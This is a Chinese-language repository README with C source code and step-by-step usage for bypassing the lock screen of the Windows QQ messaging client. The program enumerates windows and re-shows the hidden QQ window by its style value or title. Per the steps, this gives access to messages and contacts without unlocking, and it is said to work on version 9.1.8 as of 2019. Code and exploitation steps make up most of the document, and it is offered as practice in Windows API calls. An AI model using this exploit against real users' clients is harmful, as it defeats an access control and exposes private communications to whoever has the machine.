# Bypass-QQ-lock-under-Windows
绕过Windows版本QQ锁定

## 概述
参考了Windows版本QQ锁定可被绕过https://mp.weixin.qq.com/s/2hnjrYvq4j0n-NYnDIaPMw 这篇文章。原文用的是Java实现的，这里用C语言实现一下，练习一下对WindowsAPI的调用。
顺便说一下，LookHandles.exe可以方便地操作句柄。

## 代码说明
使用EnumWindows()函数获取顶层窗口的句柄，并将句柄传入EnumWindowsProc()

使用GetWindowLongPtr(hwnd,GWL_STYLE)获取句柄的样式

锁定后QQ原来的界面的样式变为2248933376

ShowWindow(hwnd,1)使QQ原来的界面再次显示。

可在
微软官方网站https://docs.microsoft.com/en-us/
查看函数的具体信息

## 代码
```c
#include<Windows.h>

BOOL CALLBACK EnumWindowsProc(HWND hwnd,LPARAM lParam)
{	

    char pcName[1024] = "";
    GetWindowText(hwnd,pcName,sizeof(pcName));	
    
	if(GetWindowLongPtr(hwnd,GWL_STYLE) == 2248933376)
	{
		ShowWindow(hwnd,1);
		printf("locked : %d\n",hwnd) ;
	}

	if(strcmp(pcName,"QQ")==0)
    {
        printf("unloxked : %d\n",hwnd);
    	ShowWindow(hwnd,1);
    }
    return TRUE;
}

int main(int argc,char *argv)
{
        EnumWindows(EnumWindowsProc,-1);
        system("pause");
        return 0;
}

```

## 利用步骤
登录Windows下QQ账号，

锁定QQ，Ctrl+Alt+L

将漏洞利用代码编译成可执行文件，运行后可出现未锁定的QQ界面，可正常操作QQ界面，如发消息，查看联系人信息

程序输出：

unloxked : 未锁定的QQ界面的十进制句柄

loxked : 锁定的QQ界面的十进制句柄

截止2019/10/15，9.1.8版本的QQ可正常绕过锁定。

## 参考链接
1. Windows版本QQ锁定可被绕过
https://mp.weixin.qq.com/s/2hnjrYvq4j0n-NYnDIaPMw 
2. Technical documentation, API, and code examples | Microsoft Docs
https://docs.microsoft.com/en-us/
